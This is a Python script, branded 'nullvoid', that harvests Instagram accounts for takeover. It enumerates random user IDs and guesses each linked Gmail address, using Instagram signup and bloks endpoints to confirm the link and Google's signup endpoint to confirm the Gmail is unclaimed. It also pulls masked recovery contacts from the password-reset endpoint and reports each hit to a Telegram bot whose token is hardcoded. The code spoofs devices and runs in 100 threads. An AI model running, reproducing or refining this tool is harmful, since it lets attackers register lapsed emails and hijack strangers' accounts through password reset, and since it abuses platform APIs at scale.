#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
nullvoid — Instagram/Google account availability harvester.
Python 3.13+. Runs until SIGINT/SIGTERM. No expiry gate.
"""

import os, sys, re, json, time, uuid, base64, secrets, random, signal
import threading
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor

import requests
import httpx
from user_agent import generate_user_agent

# ── config ────────────────────────────────────────────────────────────────────
MIN_FOLLOWERS    = 0
THREADS          = 100
USER_ID_MIN      = 2500000000
USER_ID_MAX      = 21254029834
TL_FILE          = "tl.txt"
HITS_FILE        = "hits.txt"
ERR_FILE         = "errors.log"
TELEGRAM_TIMEOUT = 12
IG_TIMEOUT       = 12
GOOGLE_TIMEOUT   = 10
BRAND            = "NULLVOID"

# ── colour ───────────────────────────────────────────────────────────────────
class C:
    GOLD   = "\x1b[38;5;220m"
    ORANGE = "\x1b[38;5;208m"
    WHITE  = "\x1b[38;5;255m"
    DIM    = "\x1b[38;5;240m"
    GREEN  = "\x1b[38;5;120m"
    RED    = "\x1b[38;5;196m"
    CYAN   = "\x1b[38;5;51m"
    PURPLE = "\x1b[1;38;5;135m"
    RESET  = "\x1b[0m"

# ── stats ────────────────────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self.lock  = threading.Lock()
        self.good  = 0
        self.hits  = 0
        self.bad   = 0
        self.start = time.time()

    def incr(self, field, n=1):
        with self.lock:
            setattr(self, field, getattr(self, field) + n)

    def snapshot(self):
        with self.lock:
            return self.good, self.hits, self.bad, int(time.time() - self.start)

STATS          = Stats()
UI_LOCK        = threading.Lock()
UI_ENABLED     = True
ERROR_LOG_LOCK = threading.Lock()

def log_error(msg):
    with ERROR_LOG_LOCK:
        try:
            with open(ERR_FILE, "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now(timezone.utc).isoformat()}] {msg}\n")
        except Exception:
            pass

def display():
    global UI_ENABLED
    if not UI_ENABLED:
        return
    good, hits, bad, up = STATS.snapshot()
    h, m, s = up // 3600, (up % 3600) // 60, up % 60
    line = (
        f"\r{C.PURPLE}{BRAND}{C.RESET} "
        f"{C.GOLD}GOOD:{C.GREEN}{good}{C.RESET} "
        f"{C.DIM}|{C.RESET} {C.GOLD}HITS:{C.WHITE}{hits}{C.RESET} "
        f"{C.DIM}|{C.RESET} {C.GOLD}BAD:{C.RED}{bad}{C.RESET} "
        f"{C.DIM}|{C.RESET} {C.DIM}{h:02d}:{m:02d}:{s:02d}{C.RESET}   "
    )
    with UI_LOCK:
        sys.stdout.write(line)
        sys.stdout.flush()

def emit_hit(text):
    global UI_ENABLED
    with UI_LOCK:
        UI_ENABLED = False
        sys.stdout.write("\r" + " " * 100 + "\r")
        print(text)
        UI_ENABLED = True
    display()

# ── atomic file I/O ──────────────────────────────────────────────────────────
def atomic_write(path, content):
    tmp = f"{path}.{os.getpid()}.{threading.get_ident()}.tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        f.write(content)
    os.replace(tmp, path)

def atomic_read(path):
    with open(path, "r", encoding="utf-8") as f:
        return f.read().strip()

# ── Google availability checker ─────────────────────────────────────────────
class GoogleChecker:
    CHARSET = "azertyuiopmlkjhgfdsqwxcvbn"

    def __init__(self):
        self._thread = threading.Thread(target=self._token_loop, daemon=True)
        self._thread.start()

    def _token_loop(self):
        while True:
            try:
                self._refresh_once()
            except Exception as e:
                log_error(f"google token refresh: {e!r}")
            time.sleep(random.uniform(8, 18))

    def _refresh_once(self):
        rand = lambda a, b: "".join(random.choice(self.CHARSET) for _ in range(random.randrange(a, b)))
        n1, n2 = rand(6, 9), rand(3, 9)
        host   = rand(15, 30)

        h1 = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "user-agent": generate_user_agent(),
        }
        r1 = requests.get(
            "https://accounts.google.com/signin/v2/usernamerecovery"
            "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB",
            headers=h1, timeout=GOOGLE_TIMEOUT,
        )
        m = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,'
            r'&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            r1.text,
        )
        if m:
            tl      = m.group(2)
            cookies = {"__Host-GAPS": host}
            h2 = {
                "authority": "accounts.google.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "origin": "https://accounts.google.com",
                "referer": (
                    "https://accounts.google.com/signup/v2/createaccount?service=mail"
                    "&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F"
                    "&parent_directed=true&theme=mn&ddm=0"
                    "&flowName=GlifWebSignIn&flowEntry=SignUp"
                ),
                "user-agent": generate_user_agent(),
            }
            data = {
                "f.req": f'["{tl}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                "deviceinfo": (
                    '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",'
                    'null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
                ),
            }
            r2 = requests.post(
                "https://accounts.google.com/_/signup/validatepersonaldetails",
                cookies=cookies, headers=h2, data=data, timeout=GOOGLE_TIMEOUT,
            )
            if '",null,"' in r2.text:
                tl = r2.text.split('",null,"')[1].split('"')[0]
            host = r2.cookies.get("__Host-GAPS", host)
            atomic_write(TL_FILE, f"{tl}//{host}\n")
            return

        h3 = {
            "accept": "*/*",
            "accept-language": "en",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "origin": "https://accounts.google.com",
            "referer": "https://accounts.google.com/",
            "user-agent": generate_user_agent(),
            "x-goog-ext-278367001-jspb": '["GlifWebSignIn"]',
            "x-same-domain": "1",
            "sec-ch-ua": '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
        }
        params = {"rpcids": "NHJMOd", "source-path": "/lifecycle/steps/signup/username", "hl": "en"}
        fake   = "".join(random.choices("abcdefghijklmnopqrstuvwxyz1234567890.", k=random.randint(16, 26)))
        body   = (
            "f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22"
            + fake
            + "%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C17359%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D"
        )
        r3 = requests.post(
            "https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute",
            params=params, headers=h3, data=body, timeout=GOOGLE_TIMEOUT,
        )
        m2 = re.search(r'"TL:([^"]+)"', r3.text)
        if m2:
            tl   = m2.group(1)
            host = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(15, 30)))
            atomic_write(TL_FILE, f"{tl}//{host}\n")

    def _load_token(self):
        for _ in range(20):
            try:
                line = atomic_read(TL_FILE)
                if "//" in line:
                    tl, host = line.split("//", 1)
                    if tl and host:
                        return tl, host
            except Exception:
                pass
            time.sleep(0.3)
        return None, None

    def check(self, email, _attempt=0):
        local = email.split("@")[0] if "@" in email else email
        tl, host = self._load_token()
        if not tl:
            log_error("google: no token available")
            return "bad"
        cookies = {"__Host-GAPS": host}
        headers = {
            "authority": "accounts.google.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "origin": "https://accounts.google.com",
            "referer": (
                "https://accounts.google.com/signup/v2/createusername?service=mail"
                "&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F"
                "&parent_directed=true&theme=mn&ddm=0"
                "&flowName=GlifWebSignIn&flowEntry=SignUp"
                f"&TL={tl}"
            ),
            "user-agent": generate_user_agent(),
        }
        params = {"TL": tl}
        body = (
            "continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp"
            "&service=mail&theme=mn"
            f"&f.req=%5B%22TL%3A{tl}%22%2C%22{local}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
            "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
            "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull"
            "%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull"
            "%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
            "&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        )
        try:
            r = requests.post(
                "https://accounts.google.com/_/signup/usernameavailability",
                params=params, cookies=cookies, headers=headers, data=body,
                timeout=GOOGLE_TIMEOUT,
            )
        except Exception as e:
            log_error(f"google check: {e!r}")
            return "bad"
        if '"gf.uar",1' in r.text:
            return "good"
        if '"er",null,null,null,null,400' in r.text and _attempt < 3:
            time.sleep(0.4)
            return self.check(email, _attempt + 1)
        return "bad"

# ── Instagram checker ───────────────────────────────────────────────────────
class InstagramChecker:
    DOC_ID        = "26672929172408668"
    APP_ID        = "936619743392459"
    BLOKS_VERSION = "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"

    def __init__(self):
        self._session  = requests.Session()
        self._csrf     = None
        self._lsd      = None
        self._mid      = base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("=")
        self._lock     = threading.Lock()
        self._ready    = threading.Event()
        threading.Thread(target=self._token_loop, daemon=True).start()

    def _token_loop(self):
        while True:
            try:
                self._fetch_tokens()
                self._ready.set()
            except Exception as e:
                log_error(f"ig token: {e!r}")
            time.sleep(300)

    def _fetch_tokens(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "x-ig-app-id": self.APP_ID,
            "x-bloks-version-id": "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
        }
        r = self._session.get("https://www.instagram.com/", headers=headers, timeout=15)
        if r.status_code != 200:
            raise RuntimeError(f"ig home {r.status_code}")
        csrf = r.cookies.get("csrftoken") or ""
        if not csrf:
            mm   = re.search(r'"csrf_token":"([^"]+)"', r.text)
            csrf = mm.group(1) if mm else ""
        lsd_m = re.search(r'"LSD",\[\],\{"token":"([^"]+)"\}', r.text)
        lsd   = lsd_m.group(1) if lsd_m else None
        if not lsd:
            lsd = csrf or secrets.token_hex(8)
        with self._lock:
            self._csrf = csrf
            self._lsd  = lsd

    @property
    def csrf(self):
        return self._csrf

    @property
    def lsd(self):
        return self._lsd

    def _ensure(self):
        if not self._ready.is_set():
            self._ready.wait(timeout=10)
        return bool(self._csrf and self._lsd)

    def _bloks(self, email):
        device    = "android-" + "".join(random.choices("abcdef0123456789", k=16))
        family    = str(uuid.uuid4())
        waterfall = str(uuid.uuid4())
        aac = (
            '{"client_input_params":{"aac":"{\\"aac_init_timestamp\\":'
            + str(int(time.time()))
            + ',\\"aacjid\\":\\"' + str(uuid.uuid4()) + '\\",\\"aaccs\\":\\"'
            + secrets.token_urlsafe(32)
            + '\\"}","flash_call_permissions_status":'
            '{"READ_PHONE_STATE":"PERMANENTLY_DENIED","READ_CALL_LOG":"DENIED",'
            '"ANSWER_PHONE_CALLS":"DENIED"},"was_headers_prefill_available":0,'
            '"network_bssid":null,"sfdid":"","fetched_email_token_list":{},'
            '"search_query":"' + email + '","auth_secure_device_id":"",'
            '"ig_oauth_token":[],"cloud_trust_token":null,"was_headers_prefill_used":0,'
            '"sso_accounts_auth_data":[],"encrypted_msisdn":"","device_network_info":null,'
            '"text_input_id":"akyuf0:61","zero_balance_state":null,"android_build_type":"release",'
            '"accounts_list":[],"is_oauth_without_permission":0,"ig_android_qe_device_id":"'
            + device + '","gms_incoming_call_retriever_eligibility":"client_not_supported",'
            '"search_screen_type":"email_or_username","is_whatsapp_installed":1,'
            '"lois_settings":{"lois_token":""},"ig_vetted_device_nonce":null,'
            '"headers_infra_flow_id":"","fetched_email_list":[]},"server_params":'
            '{"event_request_id":"' + str(uuid.uuid4()) + '","is_from_logged_out":0,'
            '"layered_homepage_experiment_group":null,"device_id":"' + device + '",'
            '"login_surface":"login_home","waterfall_id":"' + waterfall + '",'
            '"INTERNAL__latency_qpl_instance_id":6.3987980400102E13,"is_platform_login":0,'
            '"context_data":"","login_entry_point":"logged_out",'
            '"INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":"' + family + '",'
            '"offline_experiment_group":"caa_iteration_v3_perf_ig_4",'
            '"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0,'
            '"qe_device_id":"' + device + '"}}'
        )
        payload = {
            "params": aac,
            "bk_client_context": '{"bloks_version":"' + self.BLOKS_VERSION + '","styles_id":"instagram"}',
            "bloks_versioning_id": self.BLOKS_VERSION,
        }
        headers = {
            "User-Agent": "Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; "
                          "samsung; SM-A546B; a54x; exynos1380; en_US; 465123678)",
            "accept-language": "en-IN, en-US",
            "x-bloks-version-id": self.BLOKS_VERSION,
            "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
            "x-ig-android-id": device,
            "x-ig-app-id": "567067343352427",
            "x-ig-app-locale": "en_IN",
            "x-ig-client-endpoint": "com.bloks.www.caa.ar.search",
            "x-ig-device-id": device,
            "x-ig-family-device-id": family,
            "x-ig-timezone-offset": str(int(datetime.now().astimezone().utcoffset().total_seconds())),
            "x-mid": self._mid,
            "x-pigeon-rawclienttime": str(time.time()),
            "x-pigeon-session-id": f"UFS-{uuid.uuid4()}-0",
            "sec-ch-ua": '"Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        }
        try:
            r = requests.post(
                "https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/",
                data=payload, headers=headers, timeout=IG_TIMEOUT,
            )
            return email in r.text
        except Exception as e:
            log_error(f"ig bloks: {e!r}")
            return False

    def _web_create(self, email):
        if not self._ensure():
            return False
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-csrftoken": self.csrf,
            "x-ig-app-id": self.APP_ID,
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/accounts/emailsignup/",
        }
        cookies = {"csrftoken": self.csrf}
        data = {
            "email": email,
            "username": "testuser_" + str(random.randint(1000, 99999)),
            "first_name": "Test",
            "password": "Test@123456",
        }
        try:
            r = self._session.post(
                "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/",
                headers=headers, cookies=cookies, data=data, timeout=IG_TIMEOUT,
            )
            if r.status_code == 200:
                return "email" in r.json().get("errors", {})
            return False
        except Exception as e:
            log_error(f"ig web_create: {e!r}")
            return False

    def check_email(self, email):
        return self._bloks(email) or self._web_create(email)

    def get_user(self, user_id):
        if not self._ensure():
            return None
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                          "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "x-bloks-version-id": "f0fd53409d7667526e529854656fe20159af8b76db89f40c333e593b51a2ce10",
            "x-ig-app-id": self.APP_ID,
            "x-fb-lsd": self.lsd,
            "x-csrftoken": self.csrf,
            "x-fb-friendly-name": "PolarisProfilePageContentQuery",
            "sec-ch-ua-platform": '"Android"',
            "origin": "https://www.instagram.com",
            "sec-fetch-site": "same-origin",
        }
        variables = {
            "enable_integrity_filters": True,
            "id": str(user_id),
            "__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider": True,
            "__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisWebSchoolsEnabledrelayprovider": False,
            "__relay_internal__pv__PolarisRepostsConsumptionEnabledrelayprovider": False,
        }
        payload = {
            "lsd": self.lsd,
            "fb_api_caller_class": "RelayModern",
            "fb_api_req_friendly_name": "PolarisProfilePageContentQuery",
            "variables": json.dumps(variables),
            "server_timestamps": "true",
            "doc_id": self.DOC_ID,
        }
        try:
            r = self._session.post(
                "https://www.instagram.com/api/graphql",
                headers=headers, data=payload, timeout=IG_TIMEOUT,
            )
            if r.status_code == 200:
                u = r.json().get("data", {}).get("user")
                if u and u.get("username"):
                    return u
        except Exception as e:
            log_error(f"ig graphql: {e!r}")
        return None

# ── reset mask ───────────────────────────────────────────────────────────────
class ResetFetcher:
    def __init__(self):
        self._client = httpx.Client(
            http2=True,
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                              "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "x-ig-app-id": "936619743392459",
                "x-requested-with": "XMLHttpRequest",
                "origin": "https://www.instagram.com",
                "referer": "https://www.instagram.com/accounts/password/reset/",
            },
            timeout=8,
        )

    def fetch(self, username):
        try:
            r = self._client.post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": username},
            )
            if r.status_code != 200:
                return "-"
            d = r.json()
            if d.get("status") != "ok":
                return "-"
            for k in ("obfuscated_email", "contact_point", "obfuscated_phone"):
                v = d.get(k)
                if v:
                    return v
            if d.get("email_sent"):
                return "(masked)"
            return "-"
        except Exception as e:
            log_error(f"reset fetch: {e!r}")
            return "-"

# ── Telegram reporter ───────────────────────────────────────────────────────
class Reporter:
    def __init__(self, token, chat_id):
        self.token    = token
        self.chat_id  = chat_id
        self._ok      = True
        self._lock    = threading.Lock()
        self._session = requests.Session()

    def send(self, html):
        with self._lock:
            if not self._ok:
                return False
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        for attempt in range(3):
            try:
                r = self._session.post(
                    url,
                    json={"chat_id": self.chat_id, "text": html, "parse_mode": "HTML"},
                    timeout=TELEGRAM_TIMEOUT,
                )
                if r.status_code == 200:
                    return True
                log_error(f"telegram {r.status_code}: {r.text[:200]}")
            except Exception as e:
                log_error(f"telegram: {e!r}")
            time.sleep(2 * (attempt + 1))
        with self._lock:
            self._ok = False
        return False

    @staticmethod
    def save(text):
        try:
            with open(HITS_FILE, "a", encoding="utf-8") as f:
                f.write(text + "\n")
        except Exception as e:
            log_error(f"hits write: {e!r}")

# ── year estimation ─────────────────────────────────────────────────────────
_PK_YEARS = [
    (1, 5000000, 2010), (5000001, 17750000, 2011), (17750001, 279760000, 2012),
    (279760001, 900990000, 2013), (900990001, 1629010000, 2014),
    (1629010001, 2369359761, 2015), (2369359762, 4239516754, 2016),
    (4239516755, 6345108209, 2017), (6345108210, 10016232395, 2018),
    (10016232396, 27238602159, 2019), (27238602160, 43464475395, 2020),
    (43464475395, 50289297647, 2021), (50289297647, 57464707082, 2022),
    (57464707082, 63313426938, 2023), (63313426938, 70134323896, 2024),
    (70134323896, 78313496938, 2025),
]

def pk_to_year(pk):
    try:
        pk = int(pk)
    except (TypeError, ValueError):
        return "Unknown"
    for lo, hi, y in _PK_YEARS:
        if lo <= pk <= hi:
            return str(y)
    return "2025+"

def esc(s):
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

# ── output blocks ────────────────────────────────────────────────────────────
def profile_block(p, year, reset, eligible):
    lines = [
        f"{C.PURPLE}╭──────────────────────────────────────────╮{C.RESET}",
        f"{C.PURPLE}│{C.RESET}  {C.WHITE}{BRAND}{C.RESET}  {C.DIM}·{C.RESET}  {C.GREEN}HIT CAPTURED{C.RESET}",
        f"{C.PURPLE}╰──────────────────────────────────────────╯{C.RESET}",
        f"  {C.DIM}name     {C.RESET} {p['full_name'] or '-'}",
        f"  {C.DIM}handle   {C.RESET} {C.WHITE}@{p['username']}{C.RESET}",
        f"  {C.DIM}email    {C.RESET} {C.GREEN}{p['email']}{C.RESET}",
        f"  {C.DIM}followers{C.RESET} {p['follower_count']:,}",
        f"  {C.DIM}following{C.RESET} {p['following_count']:,}",
        f"  {C.DIM}posts    {C.RESET} {p['media_count']}",
        f"  {C.DIM}age      {C.RESET} {year}",
        f"  {C.DIM}bio      {C.RESET} {C.DIM}{(p['biography'] or '-')[:50]}{C.RESET}",
        f"  {C.DIM}reset    {C.RESET} {reset}",
        f"  {C.DIM}monetize {C.RESET} {'✅ eligible' if eligible else '❌ not eligible'}",
        f"  {C.DIM}profile  {C.RESET} {C.CYAN}instagram.com/{p['username']}{C.RESET}",
        f"{C.PURPLE}──────────────────────────────────────────{C.RESET}",
    ]
    return "\n".join(lines)

def telegram_block(p, year, reset, eligible):
    e = esc
    lines = [
        "╭──────────────────────────────────────────╮",
        f"  <b>{BRAND}</b>  ·  <b>HIT CAPTURED</b>",
        "╰──────────────────────────────────────────╯",
        f"  <b>name</b>      {e(p['full_name'] or '-')}",
        f"  <b>handle</b>    @{e(p['username'])}",
        f"  <b>email</b>     {e(p['email'])}",
        f"  <b>followers</b> {p['follower_count']:,}",
        f"  <b>following</b> {p['following_count']:,}",
        f"  <b>posts</b>     {p['media_count']}",
        f"  <b>age</b>       {year}",
        f"  <b>bio</b>       {e((p['biography'] or '-')[:50])}",
        f"  <b>reset</b>     {e(reset)}",
        f"  <b>monetize</b>  {'✅ eligible' if eligible else '❌ not eligible'}",
        "──────────────────────────────────────────",
        f"  <b>profile</b>   <a href='https://instagram.com/{e(p['username'])}'>@{e(p['username'])}</a>",
    ]
    return "\n".join(lines)

def is_eligible(u):
    return u.get("follower_count", 0) >= 50 and not u.get("is_private", True)

# ── worker ──────────────────────────────────────────────────────────────────
def worker(insta, google, reset, reporter):
    while True:
        try:
            uid  = random.randint(USER_ID_MIN, USER_ID_MAX)
            user = insta.get_user(uid)
            if not user:
                time.sleep(random.uniform(0.05, 0.12))
                continue
            uname = user.get("username")
            if not uname:
                continue
            followers = user.get("follower_count") or 0
            if followers < MIN_FOLLOWERS:
                continue
            email = f"{uname}@gmail.com"

            if not insta.check_email(email):
                STATS.incr("bad")
                display()
                time.sleep(random.uniform(0.05, 0.12))
                continue

            STATS.incr("good")
            display()

            if google.check(email) != "good":
                time.sleep(random.uniform(0.05, 0.12))
                continue

            STATS.incr("hits")
            profile = {
                "username":        uname,
                "email":           email,
                "full_name":       user.get("full_name", "") or "",
                "follower_count":  followers,
                "following_count": user.get("following_count") or 0,
                "media_count":     user.get("media_count") or 0,
                "is_private":      user.get("is_private", False),
                "biography":       user.get("biography", "") or "",
                "pk":              user.get("pk", ""),
            }
            year       = pk_to_year(user.get("pk"))
            reset_mask = reset.fetch(uname)
            eligible   = is_eligible(user)

            emit_hit(profile_block(profile, year, reset_mask, eligible))
            reporter.save(telegram_block(profile, year, reset_mask, eligible))
            reporter.send(telegram_block(profile, year, reset_mask, eligible))
        except Exception as e:
            log_error(f"worker: {e!r}")
            time.sleep(random.uniform(0.1, 0.25))

# ── main ─────────────────────────────────────────────────────────────────────
def bootstrap():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{C.PURPLE}  ┌──────────────────────────────────────────┐{C.RESET}")
    print(f"{C.PURPLE}  │{C.RESET}  {C.WHITE}N U L L V O I D{C.RESET}  {C.DIM}// harvest engine{C.RESET}  {C.PURPLE}│{C.RESET}")
    print(f"{C.PURPLE}  └──────────────────────────────────────────┘{C.RESET}\n")
    chat_id = "7228133991"
    print()
    bot_token = "8806879241:AAGs1WSU7P5etHwgj9p5H8P5c9VbAl-iHtU"
    print()
    return chat_id, bot_token

def main():
    chat_id, bot_token = bootstrap()
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{C.DIM}  {BRAND} · {THREADS} threads · ctrl+c to stop{C.RESET}\n")

    google   = GoogleChecker()
    insta    = InstagramChecker()
    reset    = ResetFetcher()
    reporter = Reporter(bot_token, chat_id)

    insta._ready.wait(timeout=15)
    if not insta.csrf:
        print(f"{C.RED}failed to obtain IG tokens — check network{C.RESET}")
        return

    stop = threading.Event()

    def _sig(_s, _f):
        stop.set()
        print(f"\n{C.PURPLE}◄  {BRAND} — SESSION ENDED  ►{C.RESET}")
        os._exit(0)

    signal.signal(signal.SIGINT,  _sig)
    signal.signal(signal.SIGTERM, _sig)

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = [ex.submit(worker, insta, google, reset, reporter) for _ in range(THREADS)]
        try:
            while not stop.is_set():
                time.sleep(1)
        except KeyboardInterrupt:
            stop.set()
            for f in futures:
                f.cancel()

if __name__ == "__main__":
    main()